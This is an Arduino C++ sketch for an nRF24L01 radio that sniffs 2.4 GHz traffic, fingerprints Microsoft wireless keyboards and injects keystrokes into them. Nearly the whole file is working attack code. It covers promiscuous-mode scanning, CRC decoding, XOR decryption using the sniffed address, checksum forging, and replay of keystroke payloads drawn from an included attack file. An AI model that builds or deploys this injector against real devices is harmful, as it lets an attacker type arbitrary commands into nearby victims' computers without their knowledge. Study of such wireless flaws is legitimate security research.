#include "Arduino.h"
#include <SPI.h>
#include "nRF24L01.h"
#include "RF24.h"
#include "attack.h"

#define CE 5
#define CSN 6
#define PKT_SIZE 37
#define PAY_SIZE 32
#define MS_NOCRYPT 1
#define MS_XORCRYPT 2
#define LOGITECH  3

RF24 radio(CE, CSN);

long time;
int ledpin = 13;
uint64_t promisc_addr = 0xAALL;
uint8_t channel = 25;
uint64_t address;
uint8_t payload[PAY_SIZE];
uint8_t payload_size;
uint16_t sequence;

void print_payload_details()
{
  Serial.print("ch: ");
  Serial.print(channel);
  Serial.print(" s: ");
  Serial.print(payload_size);
  Serial.print(" a: ");
  for (int j = 0; j < 5; j++)
  {
    Serial.print((uint8_t)(address >> (8 * j) & 0xff), HEX);
    Serial.print(" ");
  }
  Serial.print(" p: ");
  for (int j = 0; j < payload_size; j++)
  {
    Serial.print(payload[j], HEX);
    Serial.print(" ");
  }
  Serial.println("");
  return;
}

// Update a CRC16-CCITT with 1-8 bits from a given byte
uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
{
  crc = crc ^ (byte << 8);
  while(bits--)
    if((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
    else crc = crc << 1;
  crc = crc & 0xFFFF;
  return crc;
}

uint8_t writeRegister(uint8_t reg, uint8_t value)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  digitalWrite(CSN, HIGH);
  return status;
}

uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
{
  uint8_t status;

  digitalWrite(CSN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  while (len--)
    SPI.transfer(*buf++);
  digitalWrite(CSN, HIGH);

  return status;
}

bool transmit()
{
  //radio.stopListening();
  print_payload_details();
  radio.write(payload, payload_size);
  //radio.startListening();
  return true;
}

void scan() {
  Serial.println("starting scan...");

  int x, offset;
  uint8_t buf[PKT_SIZE];
  uint16_t wait = 100;
  uint8_t payload_length;
  uint16_t crc, crc_given;

  // the order of the following is VERY IMPORTANT
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  // RF24 doesn't ever fully set this -- only certain bits of it
  writeRegister(0x02, 0x00);
  // RF24 doesn't have a native way to change MAC...
  // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
  writeRegister(0x03, 0x00);
  radio.openReadingPipe(0, promisc_addr);
  radio.disableCRC();
  radio.startListening();
  radio.printDetails();

  while (1) {
    channel++;
    if (channel > 80) {
      digitalWrite(ledpin, HIGH);
      channel = 2;
    }

    if (channel == 4) {
      digitalWrite(ledpin, LOW);
    }

    if (channel == 40) {
      digitalWrite(ledpin, HIGH);
    }

    if (channel == 42) {
      digitalWrite(ledpin, LOW);
    }

    //Serial.print("tuning radio to ");
    //Serial.println(2400 + channel);
    radio.setChannel(channel);

    time = millis();
    while (millis() - time < wait)
    {
      if (radio.available())
      {
        radio.read(&buf, sizeof(buf));

        // In promiscuous mode without a defined address prefix, we attempt to
        // decode the payload as-is, and then shift it by one bit and try again
        // if the first attempt did not pass the CRC check. The purpose of this
        // is to minimize missed detections that happen if we were to use both
        // 0xAA and 0x55 as the nonzero promiscuous mode address bytes.

        for (offset = 0; offset < 2; offset++) {
          // Shift the payload right by one bit if this is the second pass
          if (offset == 1) {
            for (x = 31; x >= 0; x--) {
              if (x > 0) buf[x] = buf[x - 1] << 7 | buf[x] >> 1;
              else buf[x] = buf[x] >> 1;
            }
          }

          // Read the payload length
          payload_length = buf[5] >> 2;

          // Check for a valid payload length, which is less than the usual 32 bytes
          // because we need to account for the packet header, CRC, and part or all
          // of the address bytes.
          if (payload_length <= (PAY_SIZE-9))
          {
            // Read the given CRC
            crc_given = (buf[6 + payload_length] << 9) | ((buf[7 + payload_length]) << 1);
            crc_given = (crc_given << 8) | (crc_given >> 8);
            if (buf[8 + payload_length] & 0x80) crc_given |= 0x100;

            // Calculate the CRC
            crc = 0xFFFF;
            for (x = 0; x < 6 + payload_length; x++) crc = crc_update(crc, buf[x], 8);
            crc = crc_update(crc, buf[6 + payload_length] & 0x80, 1);
            crc = (crc << 8) | (crc >> 8);

            // Verify the CRC
            if (crc == crc_given && payload_length > 0)
            {
              // Write the address
              address = 0;
              for (int i = 0; i < 4; i++)
              {
                address += buf[i];
                address <<= 8;
              }
              address += buf[4];

              // Write the ESB payload to the output buffer
              for(x = 0; x < payload_length + 3; x++)
                payload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
              payload_size = payload_length;

              //radio.flush_rx();
              print_payload_details();
              return;
            }
          }
        }
      }
    }
  }
}

void start_transmit()
{
  radio.stopListening();
  radio.openWritingPipe(address);
  radio.setAutoAck(true);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.enableDynamicPayloads();
  radio.setChannel(channel);
  writeRegister(0x03, 0x03);
  return;
}

// decrypt those keyboard packets!
void ms_crypt()
{
  for (int i = 4; i < payload_size; i++)
    payload[i] ^= address >> (((i - 4) % 5) * 8) & 0xFF;
}

// calculate microsoft wireless keyboard checksum
void ms_checksum()
{
  int last = payload_size - 1;
  payload[last] = 0;
  for (int i = 0; i < last; i++)
    payload[last] ^= payload[i];
  payload[last] = ~payload[last];
}

uint8_t fingerprint()
{
  if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40)
  {
    return MS_NOCRYPT;
  }
  else if (payload_size == 19 && payload[0] == 0x0a)
  {
    return MS_XORCRYPT;
  }
  return 0;
}

void ms_transmit(uint8_t meta, uint8_t hid, bool use_crypt)
{
  if (use_crypt) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  payload[7] = meta;
  payload[9] = hid;
  ms_checksum();
  if (use_crypt) ms_crypt();
  // send keystroke (key down)
  transmit();
  sequence++;

  if (use_crypt) ms_crypt();
  for (int n = 4; n < payload_size; n++)
    payload[n] = 0;
  payload[4] = sequence & 0xff;
  payload[5] = sequence >> 8 & 0xff;
  payload[6] = 67;
  ms_checksum();
  if (use_crypt) ms_crypt();
  // send null keystroke (key up)
  transmit();
  sequence++;

  // inter-keystroke delay
  delay(5);
  return;
}

void attack_microsoft(bool use_crypt)
{
  Serial.print("attack_microsoft: ");
  if (use_crypt) Serial.println("use_crypt = true");
  else Serial.println("use_crypt = false");

  uint8_t meta = 0;
  uint8_t hid = 0;
  uint8_t wait = 0;
  int offset = 0;

  int keycount = sizeof(attack) / 3;
  sequence = 0;

  // this is to sync the new serial
  for (int i = 0; i < 6; i++)
  {
    ms_transmit(0, 0, use_crypt);
  }

  // now inject the hid codes
  for (int i = 0; i < keycount; i++)
  {
    offset = i * 3;
    meta = attack[offset];
    hid = attack[offset + 1];
    wait = attack[offset + 2];

    if (hid) {
      ms_transmit(meta, hid, use_crypt);
    }
    if (wait) {
      delay(wait << 4);
    }
  }
  return;
}

void attack_logitech()
{
  Serial.println("attack_logitech: Not implemented :(");
  return;
}

void setup() {
  Serial.begin(115200);
  pinMode(ledpin, OUTPUT);
  digitalWrite(ledpin, LOW);
}

void loop() {
  radio.begin();
  scan();
  uint8_t hw = fingerprint();
  if (hw) {
    digitalWrite(ledpin, HIGH);
    start_transmit();
    switch(hw) {
      case MS_NOCRYPT:
        attack_microsoft(false);
        break;
      case MS_XORCRYPT:
        attack_microsoft(true);
        break;
      case LOGITECH:
        attack_logitech();
        break;
    }
    digitalWrite(ledpin, LOW);
  }
}
